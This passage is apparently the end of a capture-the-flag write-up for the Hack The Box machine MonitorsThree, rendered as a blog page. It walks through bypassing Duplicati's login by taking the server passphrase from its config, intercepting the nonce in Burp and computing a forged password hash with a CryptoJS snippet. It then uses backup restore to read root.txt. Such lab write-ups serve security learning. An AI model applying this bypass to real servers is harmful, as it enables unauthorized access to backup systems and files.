+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/dserver.png" alt="duplicati server" />
+      
+    </figure>
+
+First step was finding the duplicati server config</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/serverpass.png" alt="server pass" />
+      
+    </figure>
+</p>
+<pre tabindex="0"><code>Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
+</code></pre><p>Next convert server passphrase from base64 to hex
+
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /monitorsthree/base64-hex_hu14587034992736614344.png 330w,
+        /monitorsthree/base64-hex_hu13545609351493919458.png 660w,
+        /monitorsthree/base64-hex_hu11465066880042906868.png 1024w,
+        /monitorsthree/base64-hex_hu17683224945935077473.png 2x"
+        src="/monitorsthree/base64-hex_hu13545609351493919458.png"
+        alt="convert"
+      />
+      
+    </figure>
+</p>
+<pre tabindex="0"><code>59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a
+</code></pre><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /monitorsthree/intercept_hu1442974314478132456.png 330w,
+        /monitorsthree/intercept_hu9766389459046380280.png 660w,
+        /monitorsthree/intercept_hu15158670512622836304.png 1024w,
+        /monitorsthree/intercept_hu10268414335959668359.png 2x"
+        src="/monitorsthree/intercept_hu9766389459046380280.png"
+        alt="intercept"
+      />
+      
+    </figure>
+
+turn on intercept on burp and then right click and hit &ldquo;do intercept&rdquo; &ldquo;response to this request&rdquo;</p>
+<p>hit forward
+
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /monitorsthree/noncea_hu13393342265098369619.png 330w,
+        /monitorsthree/noncea_hu2115770504630254547.png 660w,
+        /monitorsthree/noncea_hu5851772309848111802.png 1024w,
+        /monitorsthree/noncea_hu12354113908223472450.png 2x"
+        src="/monitorsthree/noncea_hu2115770504630254547.png"
+        alt="noncea"
+      />
+      
+    </figure>
+
+make sure you mark down this nonce  (this will be diffrent for everyone)</p>
+<pre tabindex="0"><code>wqCENkgcvVIlDPe9Q3HpaNhz+YXmYk8FNLoOQfIzCEM=
+</code></pre><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /monitorsthree/formula_hu16677948780542376453.png 330w,
+        /monitorsthree/formula_hu10923034226306347346.png 660w,
+        /monitorsthree/formula_hu510868397897175608.png 1024w,
+        /monitorsthree/formula_hu5033360594932926049.png 2x"
+        src="/monitorsthree/formula_hu10923034226306347346.png"
+        alt="formula"
+      />
+      
+    </figure>
+</p>
+<pre tabindex="0"><code>var saltedpwd = &#39;HexOutputFromCyberChef&#39;; // Replace with the Hex output from step 6
+var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(&#39;NonceFromBurp&#39;) + saltedpwd)).toString(CryptoJS.enc.Base64); // Replace &#39;NonceFromBurp&#39; with the intercepted nonce
+console.log(noncedpwd);
+</code></pre><p>our hex is the 59be string and our &rsquo;noncefromburp&rsquo; is our wqCE</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/nonced1.png" alt="nonced1" />
+      
+    </figure>
+</p>
+<pre tabindex="0"><code>j65vMghwC8l+b+RjSm2VvMNsA43fKKsf/jnqDW5FfTo=
+</code></pre><p>back on burp hit forward again
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/passwordvar.png" alt="password var" />
+      
+    </figure>
+
+we need to replace this 1ak variable with our &lsquo;j65vM&rsquo; fully nonced string</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/pastedin.png" alt="pasted in" />
+      
+    </figure>
+
+then we need to url encode it
+higlight it in burp and hit ctrl + u</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/urlencoded.png" alt="url encoded" />
+      
+    </figure>
+</p>
+<p>now were ready send it on</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/monitorsthree/adnwerein.png" alt="adn were in" />
+      
+    </figure>
+
+we can turn intercept off and just focus on our browser now</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /monitorsthree/root.txt_hu1425446052195184776.png 330w,
+        /monitorsthree/root.txt_hu2691574211607051935.png 660w,
+        /monitorsthree/root.txt_hu7372362649229092975.png 1024w,
+        /monitorsthree/root.txt_hu9826550121676703790.png 2x"
+        src="/monitorsthree/root.txt_hu2691574211607051935.png"
+        alt="root txt "
+      />
+      
+    </figure>
+
+What i did here was utilise the back up restoring software to restore the root.txt to marcus&rsquo;s folder</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /monitorsthree/pwnd_hu10125422277317427405.png 330w,
+        /monitorsthree/pwnd_hu14389850540292849733.png 660w,
+        /monitorsthree/pwnd_hu8213905292400240664.png 1024w,
+        /monitorsthree/pwnd_hu11031254290438555427.png 2x"
+        src="/monitorsthree/pwnd_hu14389850540292849733.png"
+        alt="pwnd"
+      />
+      
+    </figure>
+</p>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+        
+
+          
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_posts\/htb\/monitors\/MonitorsThree.md"
+        var oid_likes = "likes_posts\/htb\/monitors\/MonitorsThree.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
+      
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/htb/blurry/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Blurry</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-09-29T13:49:05&#43;00:00">September 29, 2024</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex flex-col list-none sm:flex-row">
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="https://external-link"
+            title="">
+            
+            Privacy
+          </a>
+        </li>
+        
+      </ul>
+    </nav>
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2024
+      
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="http://localhost:1313/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
